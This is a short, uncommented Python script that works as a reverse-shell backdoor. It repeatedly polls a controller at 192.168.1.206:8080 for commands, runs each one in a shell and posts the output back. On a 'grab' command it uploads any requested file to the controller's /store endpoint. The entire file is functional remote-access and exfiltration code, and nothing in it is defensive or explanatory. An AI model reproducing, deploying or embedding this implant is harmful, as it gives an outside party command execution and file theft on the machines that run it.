import requests
import os
import subprocess
import time

'http://192.168.1.206:8080'

while True:
    req = requests.get('http://192.168.1.206:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.206:8080/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.206:8080', data='[-] Not able to find the file.')
    else:
        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = CMD.communicate()
        
        if error:
            post_response = requests.post(url='http://192.168.1.206:8080', data=error)
        elif output:
            post_response = requests.post(url='http://192.168.1.206:8080', data=output)
        else:
            post_response = requests.post(url='http://192.168.1.206:8080', data="No output or error")

    time.sleep(3)
